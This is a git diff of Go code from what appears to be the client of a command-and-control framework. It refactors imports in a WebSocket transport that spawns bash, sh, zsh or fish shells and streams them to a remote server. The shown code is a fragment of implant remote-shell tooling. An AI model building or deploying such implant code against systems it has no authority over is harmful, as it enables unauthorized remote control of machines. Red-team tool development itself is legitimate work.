@@ -15,12 +15,14 @@ import (
 	"sync"
 	"time"
 
-	"github.com/RabbITCybErSeC/BaconC2/client/models"
+	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
+
 	"github.com/gorilla/websocket"
 )
 
 type WebSocketTransportProvider interface {
-	NewWebSocketTransport(serverURL, agentID string) models.IStreamingTransport
+	NewWebSocketTransport(serverURL, agentID string) local_models.IStreamingTransport
 }
 
 const (
@@ -40,7 +42,7 @@ type WebSocketTransport struct {
 	shells    []string
 }
 
-func NewWebSocketTransport(serverURL, agentID string) models.IStreamingTransport {
+func NewWebSocketTransport(serverURL, agentID string) local_models.IStreamingTransport {
 	ctx, cancel := context.WithCancel(context.Background())
 	t := &WebSocketTransport{
 		serverURL: serverURL,
@@ -119,7 +121,7 @@ func getSystemShells() ([]string, error) {
 }
 
 // StartStreamingSession initiates a WebSocket-based shell session.
-func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *models.StreamingConfig, resultChan chan<- models.CommandResult) error {
+func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *local_models.StreamingConfig, resultChan chan<- models.CommandResult) error {
 	if sessionType != "shell" {
 		err := fmt.Errorf("unsupported session type: %s", sessionType)
 		resultChan <- models.CommandResult{
@@ -130,7 +132,7 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *m
 		return err
 	}
 
-	if config.ShellType == models.ShellTypeUnknown {
+	if config.ShellType == local_models.ShellTypeUnknown {
 		err := fmt.Errorf("invalid shell type: %s", config.ShellType)
 		resultChan <- models.CommandResult{
 			ID:     "session_start",
@@ -196,24 +198,24 @@ func (t *WebSocketTransport) StartStreamingSession(sessionType string, config *m
 }
 
 // startShellProcess spawns a shell process based on the provided shell type.
-func (t *WebSocketTransport) startShellProcess(shellType models.ShellType, config *models.StreamingConfig) (*exec.Cmd, error) {
+func (t *WebSocketTransport) startShellProcess(shellType local_models.ShellType, config *local_models.StreamingConfig) (*exec.Cmd, error) {
 	shellPath := ""
 	for _, shell := range t.shells {
 		base := filepath.Base(filepath.Clean(shell))
 		switch shellType {
-		case models.ShellTypeBash:
+		case local_models.ShellTypeBash:
 			if base == "bash" {
 				shellPath = shell
 			}
-		case models.ShellTypeSh:
+		case local_models.ShellTypeSh:
 			if base == "sh" {
 				shellPath = shell
 			}
-		case models.ShellTypeZsh:
+		case local_models.ShellTypeZsh:
 			if base == "zsh" {
 				shellPath = shell
 			}
-		case models.ShellTypeFish:
+		case local_models.ShellTypeFish:
 			if base == "fish" {
 				shellPath = shell
 			}
